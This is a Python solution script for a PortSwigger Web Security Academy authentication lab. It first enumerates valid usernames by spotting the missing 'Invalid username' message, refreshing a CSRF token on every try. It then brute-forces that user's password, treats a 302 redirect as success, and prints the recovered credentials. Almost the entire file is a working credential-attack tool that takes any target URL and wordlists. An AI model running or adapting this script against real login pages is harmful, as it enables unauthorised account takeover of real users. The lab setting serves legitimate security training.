# Lab 01 — Username enumeration via different responses
# PortSwigger: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
#
# Vulnerability: "Invalid username" vs "Incorrect password" — distinct messages
#                reveal whether a username exists before any password is needed
# Aim:           Enumerate a valid username, brute-force their password, log in
#
# Technique:
#   Phase 1: POST /login with each candidate username + a dummy password.
#            "Invalid username"  → username doesn't exist.
#            "Incorrect password" → username EXISTS, wrong password.
#   Phase 2: POST /login with valid username + each candidate password.
#            302 redirect → success.
#
#   Wordlists: use PortSwigger's provided lists (right-click any lab page →
#   "Content-length" wordlists). Passed as CLI args here.
#
# Usage: python authentication_lab01.py <url> <usernames_file> <passwords_file>

import sys
import urllib3
from proxies import proxies
from authentication_utils import (banner, section, make_session, get_csrf_from_response,
                                   load_wordlist, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

INVALID_USER_MSG = "Invalid username"
VALID_USER_SIGNAL = "Incorrect password"


def enumerate_username(session, url, usernames):
    print(f"  ➜  Testing {len(usernames)} usernames...\n")
    for i, username in enumerate(usernames, 1):
        page = session.get(f"{url}/login")
        csrf = get_csrf_from_response(page.text)
        data = {"username": username, "password": "dummypassword"}
        if csrf:
            data["csrf"] = csrf
        r = session.post(f"{url}/login", data=data, allow_redirects=True)

        if INVALID_USER_MSG not in r.text:
            print(f"  ✔  Valid username found: {username!r} (response differs from baseline)")
            return username

        if i % 50 == 0:
            print(f"  ·  {i}/{len(usernames)} tested...")

    return None


def brute_force_password(session, url, username, passwords):
    print(f"  ➜  Brute-forcing password for {username!r} ({len(passwords)} candidates)...\n")
    for i, password in enumerate(passwords, 1):
        page = session.get(f"{url}/login")
        csrf = get_csrf_from_response(page.text)
        data = {"username": username, "password": password}
        if csrf:
            data["csrf"] = csrf
        r = session.post(f"{url}/login", data=data, allow_redirects=False)

        if r.status_code == 302:
            print(f"  ✔  Password found: {password!r}")
            return password

        if i % 50 == 0:
            print(f"  ·  {i}/{len(passwords)} tried...")

    return None


if __name__ == "__main__":
    banner()
    section("LAB 01 — USERNAME ENUMERATION VIA DIFFERENT RESPONSES")

    if len(sys.argv) != 4:
        print("  Usage: python authentication_lab01.py <url> <usernames_file> <passwords_file>")
        sys.exit(1)

    url, ufile, pfile = sys.argv[1], sys.argv[2], sys.argv[3]
    session = make_session(proxies)

    usernames = load_wordlist(ufile)
    passwords = load_wordlist(pfile)

    if not usernames or not passwords:
        sys.exit(1)

    section("Phase 1: Username Enumeration")
    valid_user = enumerate_username(session, url, usernames)
    if not valid_user:
        print("  ✘  No valid username found — check wordlist or error message string")
        sys.exit(1)

    section("Phase 2: Password Brute-Force")
    valid_pass = brute_force_password(session, url, valid_user, passwords)
    if not valid_pass:
        print("  ✘  No valid password found in wordlist")
        sys.exit(1)

    print_box("CREDENTIALS FOUND", f"Username: {valid_user}\nPassword: {valid_pass}")
    print(f"  ➜  Log in at: {url}/login")
